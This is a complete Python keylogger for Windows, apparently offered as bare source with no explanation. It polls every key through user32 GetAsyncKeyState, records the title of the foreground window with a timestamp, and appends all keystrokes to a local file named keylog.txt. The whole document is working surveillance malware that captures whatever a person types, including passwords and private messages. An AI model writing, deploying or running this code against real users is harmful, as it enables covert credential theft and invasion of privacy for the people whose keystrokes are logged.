import ctypes
import datetime

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(key)

def start_keylogger():
    current_window = None

    while True:
        fg_window = user32.GetForegroundWindow()
        fg_window_title = ctypes.create_string_buffer(512)
        user32.GetWindowTextA(fg_window, fg_window_title, 512)

        if fg_window != current_window:
            current_window = fg_window
            write_to_file(f"\n\n[{datetime.datetime.now()}] - {fg_window_title.value.decode('utf-8')}\n")

        for i in range(1, 256):
            if user32.GetAsyncKeyState(i) & 0x0001:
                if 32 < i < 127:
                    write_to_file(chr(i))
                else:
                    write_to_file(f"[{i}]")

if __name__ == "__main__":
    start_keylogger()
